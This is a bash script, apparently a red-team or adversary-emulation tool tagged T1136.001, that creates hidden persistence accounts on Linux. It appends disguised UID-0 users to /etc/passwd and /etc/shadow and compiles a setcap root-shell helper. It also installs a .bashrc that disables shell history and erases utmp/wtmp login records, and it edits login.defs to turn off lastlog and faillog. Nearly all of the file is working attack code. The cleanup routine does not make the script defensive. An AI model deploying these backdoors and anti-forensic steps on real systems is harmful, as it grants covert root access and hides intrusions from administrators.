#!/bin/bash
# T1136.001 — Create Account: Phantom User
# Creates hidden UID-0 users invisible to standard enumeration

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m'

MARKER="d3m0n_phantom"

banner_phantom() {
    echo -e "${RED}"
    echo "  ╔═══════════════════════════════════════════════╗"
    echo "  ║   T1136.001 — Phantom User Creation           ║"
    echo "  ║   Hidden UID-0 users invisible to enumeration ║"
    echo "  ╚═══════════════════════════════════════════════╝"
    echo -e "${NC}"
}

gen_password_hash() {
    local pass="$1"
    if command -v openssl &>/dev/null; then
        openssl passwd -6 "$pass" 2>/dev/null
    elif command -v mkpasswd &>/dev/null; then
        mkpasswd -m sha-512 "$pass" 2>/dev/null
    else
        python3 -c "import crypt; print(crypt.crypt('${pass}', crypt.mksalt(crypt.METHOD_SHA512)))" 2>/dev/null
    fi
}

create_uid0_clone() {
    echo -e "${CYAN}[*] Creating UID-0 clone user (direct /etc/passwd edit)${NC}"
    [[ $EUID -ne 0 ]] && { echo -e "${RED}[!] Root required${NC}"; return; }

    read -p "  Username [systemd-private]: " UNAME
    UNAME="${UNAME:-systemd-private}"

    # Check if already exists
    if grep -q "^${UNAME}:" /etc/passwd 2>/dev/null; then
        echo -e "${YELLOW}[!] User already exists${NC}"
        return
    fi

    read -p "  Password: " -s UPASS; echo ""
    read -p "  Home directory [/var/lib/.${UNAME}]: " UHOME
    UHOME="${UHOME:-/var/lib/.${UNAME}}"
    read -p "  Shell [/bin/bash]: " USHELL
    USHELL="${USHELL:-/bin/bash}"

    local HASH
    HASH=$(gen_password_hash "$UPASS")
    [[ -z "$HASH" ]] && { echo -e "${RED}[!] Failed to generate password hash${NC}"; return; }

    # Backup
    cp /etc/passwd /etc/passwd.d3m0n_bak 2>/dev/null
    cp /etc/shadow /etc/shadow.d3m0n_bak 2>/dev/null

    # Add to passwd with UID 0, GID 0 — looks like a system account
    echo "${UNAME}:x:0:0:${MARKER} system service:${UHOME}:${USHELL}" >> /etc/passwd

    # Add to shadow — no password aging (stealth)
    echo "${UNAME}:${HASH}:19000:0:99999:7:::" >> /etc/shadow

    # Create home
    mkdir -p "$UHOME" 2>/dev/null
    chmod 700 "$UHOME" 2>/dev/null
    cp /etc/skel/.bashrc "${UHOME}/" 2>/dev/null
    cp /etc/skel/.profile "${UHOME}/" 2>/dev/null

    echo -e "${GREEN}[+] UID-0 user created: ${UNAME}${NC}"
    echo -e "${GREEN}[+] Login: su - ${UNAME} (or ssh ${UNAME}@target)${NC}"
    echo -e "${YELLOW}[*] This user has full root access via UID 0${NC}"
}

create_nologin_cap() {
    echo -e "${CYAN}[*] Creating nologin user with capabilities${NC}"
    [[ $EUID -ne 0 ]] && { echo -e "${RED}[!] Root required${NC}"; return; }

    read -p "  Username [_apt-cache]: " UNAME
    UNAME="${UNAME:-_apt-cache}"

    if grep -q "^${UNAME}:" /etc/passwd 2>/dev/null; then
        echo -e "${YELLOW}[!] User already exists${NC}"
        return
    fi

    # Use high UID to look like a system service account
    local UID_NUM
    UID_NUM=$((RANDOM % 100 + 900))

    echo "${UNAME}:x:${UID_NUM}:${UID_NUM}:${MARKER} cache service:/nonexistent:/usr/sbin/nologin" >> /etc/passwd
    echo "${UNAME}:!:19000:0:99999:7:::" >> /etc/shadow
    echo "${UNAME}:x:${UID_NUM}:" >> /etc/group

    # Create a helper binary owned by this user with setuid capability
    local HELPER="/usr/lib/.${UNAME}_helper"
    cat > "/tmp/_helper.c" << 'CEOF'
#include <unistd.h>
#include <stdlib.h>
int main() { setuid(0); setgid(0); system("/bin/bash"); return 0; }
CEOF

    if command -v gcc &>/dev/null; then
        gcc -o "$HELPER" /tmp/_helper.c 2>/dev/null
        rm -f /tmp/_helper.c
        chown "${UNAME}:${UNAME}" "$HELPER" 2>/dev/null
        chmod 755 "$HELPER" 2>/dev/null
        setcap cap_setuid,cap_setgid+ep "$HELPER" 2>/dev/null
        echo -e "${GREEN}[+] Capability-enabled helper: ${HELPER}${NC}"
        echo -e "${GREEN}[+] Run as any user to get root: ${HELPER}${NC}"
    else
        rm -f /tmp/_helper.c
        echo -e "${YELLOW}[!] gcc not found — helper not created${NC}"
    fi

    echo -e "${GREEN}[+] Service account created: ${UNAME} (UID ${UID_NUM})${NC}"
}

create_invisible_user() {
    echo -e "${CYAN}[*] Creating user invisible to who/last/w/finger${NC}"
    [[ $EUID -ne 0 ]] && { echo -e "${RED}[!] Root required${NC}"; return; }

    read -p "  Username [syslogd]: " UNAME
    UNAME="${UNAME:-syslogd}"
    read -p "  Password: " -s UPASS; echo ""

    if grep -q "^${UNAME}:" /etc/passwd 2>/dev/null; then
        echo -e "${YELLOW}[!] User already exists${NC}"
        return
    fi

    local HASH
    HASH=$(gen_password_hash "$UPASS")
    [[ -z "$HASH" ]] && { echo -e "${RED}[!] Hash generation failed${NC}"; return; }

    local UHOME="/var/lib/.${UNAME}"
    echo "${UNAME}:x:0:0:${MARKER} daemon:${UHOME}:/bin/bash" >> /etc/passwd
    echo "${UNAME}:${HASH}:19000:0:99999:7:::" >> /etc/shadow

    mkdir -p "$UHOME" 2>/dev/null
    chmod 700 "$UHOME" 2>/dev/null

    # Create a .bashrc that suppresses utmp/wtmp logging on login
    cat > "${UHOME}/.bashrc" << 'BEOF'
# Suppress login logging
unset HISTFILE
export HISTSIZE=0
export HISTFILESIZE=0

# Clear our utmp/wtmp entry on login
_d3m0n_hide() {
    local TTY_NAME
    TTY_NAME=$(tty 2>/dev/null | sed 's|/dev/||')
    # Remove from utmp (who/w)
    if command -v utmpdump &>/dev/null; then
        utmpdump /var/run/utmp 2>/dev/null | grep -v "$TTY_NAME" | utmpdump -r -o /var/run/utmp 2>/dev/null
    fi
    # Remove last entry from wtmp (last)
    if command -v utmpdump &>/dev/null; then
        utmpdump /var/log/wtmp 2>/dev/null | head -n -1 | utmpdump -r -o /var/log/wtmp 2>/dev/null
    fi
}
_d3m0n_hide 2>/dev/null
unset -f _d3m0n_hide
BEOF
    chmod 600 "${UHOME}/.bashrc" 2>/dev/null

    echo -e "${GREEN}[+] Invisible user created: ${UNAME}${NC}"
    echo -e "${GREEN}[+] UID 0 (root), auto-clears utmp/wtmp on login${NC}"
    echo -e "${YELLOW}[*] Won't appear in who/w/last after login${NC}"
}

create_logindef_bypass() {
    echo -e "${CYAN}[*] Modifying /etc/login.defs for stealth${NC}"
    [[ $EUID -ne 0 ]] && { echo -e "${RED}[!] Root required${NC}"; return; }

    local LDF="/etc/login.defs"
    [[ ! -f "$LDF" ]] && { echo -e "${RED}[!] ${LDF} not found${NC}"; return; }

    cp "$LDF" "${LDF}.d3m0n_bak" 2>/dev/null

    echo -e "  ${CYAN}[1]${NC} Disable lastlog on login"
    echo -e "  ${CYAN}[2]${NC} Disable faillog recording"
    echo -e "  ${CYAN}[3]${NC} Lower MIN_UID to hide phantom users in system range"
    echo -e "  ${CYAN}[4]${NC} All of the above"
    read -p "  Choose [1-4]: " lopt

    case "$lopt" in
        1|4)
            if grep -q "^LASTLOG_ENAB" "$LDF"; then
                sed -i 's/^LASTLOG_ENAB.*/LASTLOG_ENAB no/' "$LDF"
            else
                echo "LASTLOG_ENAB no" >> "$LDF"
            fi
            echo -e "${GREEN}  [+] lastlog disabled${NC}"
            ;;&
        2|4)
            if grep -q "^FAILLOG_ENAB" "$LDF"; then
                sed -i 's/^FAILLOG_ENAB.*/FAILLOG_ENAB no/' "$LDF"
            else
                echo "FAILLOG_ENAB no" >> "$LDF"
            fi
            echo -e "${GREEN}  [+] faillog disabled${NC}"
            ;;&
        3|4)
            if grep -q "^UID_MIN" "$LDF"; then
                sed -i 's/^UID_MIN.*/UID_MIN 100/' "$LDF"
            fi
            echo -e "${GREEN}  [+] UID_MIN lowered to 100${NC}"
            ;;
    esac

    echo -e "${GREEN}[+] login.defs modified${NC}"
}

phantom_cleanup() {
    echo -e "${CYAN}[*] Cleaning up phantom users...${NC}"
    [[ $EUID -ne 0 ]] && { echo -e "${RED}[!] Root required${NC}"; return; }

    # Find and list phantom users
    local found=0
    while IFS=: read -r user _ uid _ gecos _ _; do
        if [[ "$gecos" == *"$MARKER"* ]]; then
            echo -e "  Found: ${CYAN}${user}${NC} (UID: ${uid}, GECOS: ${gecos})"
            found=$((found + 1))
        fi
    done < /etc/passwd

    if [[ $found -eq 0 ]]; then
        echo -e "${YELLOW}[!] No phantom users found${NC}"
        return
    fi

    read -p "  Remove all phantom users? [y/N]: " yn
    [[ ! "$yn" =~ ^[Yy] ]] && return

    # Remove from passwd and shadow
    local tmpP tmpS
    tmpP=$(mktemp)
    tmpS=$(mktemp)
    grep -v "$MARKER" /etc/passwd > "$tmpP"
    # Get phantom usernames to remove from shadow
    local phantoms
    phantoms=$(grep "$MARKER" /etc/passwd | cut -d: -f1)
    cp /etc/shadow "$tmpS"
    for u in $phantoms; do
        sed -i "/^${u}:/d" "$tmpS"
        # Remove home
        local home
        home=$(grep "^${u}:" /etc/passwd | cut -d: -f6)
        [[ -d "$home" && "$home" == /var/lib/.* ]] && rm -rf "$home"
        # Remove group
        sed -i "/^${u}:/d" /etc/group 2>/dev/null
        # Remove capability helpers
        rm -f "/usr/lib/.${u}_helper" 2>/dev/null
        echo -e "${GREEN}  [+] Removed: ${u}${NC}"
    done

    cat "$tmpP" > /etc/passwd
    cat "$tmpS" > /etc/shadow
    rm -f "$tmpP" "$tmpS"

    # Restore login.defs if backed up
    [[ -f /etc/login.defs.d3m0n_bak ]] && {
        cp /etc/login.defs.d3m0n_bak /etc/login.defs
        rm -f /etc/login.defs.d3m0n_bak
        echo -e "${GREEN}  [+] login.defs restored${NC}"
    }

    echo -e "${GREEN}[+] Cleanup complete${NC}"
}

main() {
    banner_phantom

    echo -e "  ${CYAN}[1]${NC} UID-0 clone (full root, direct passwd edit)"
    echo -e "  ${CYAN}[2]${NC} Nologin service account with cap helper"
    echo -e "  ${CYAN}[3]${NC} Invisible user (auto-clear utmp/wtmp)"
    echo -e "  ${CYAN}[4]${NC} Modify login.defs for stealth"
    echo -e "  ${CYAN}[5]${NC} Cleanup all phantom users"
    echo ""
    read -p "Choose [1-5]: " OPT

    case "$OPT" in
        1) create_uid0_clone ;;
        2) create_nologin_cap ;;
        3) create_invisible_user ;;
        4) create_logindef_bypass ;;
        5) phantom_cleanup ;;
        *) echo -e "${RED}[!] Invalid option${NC}" ;;
    esac
}

main
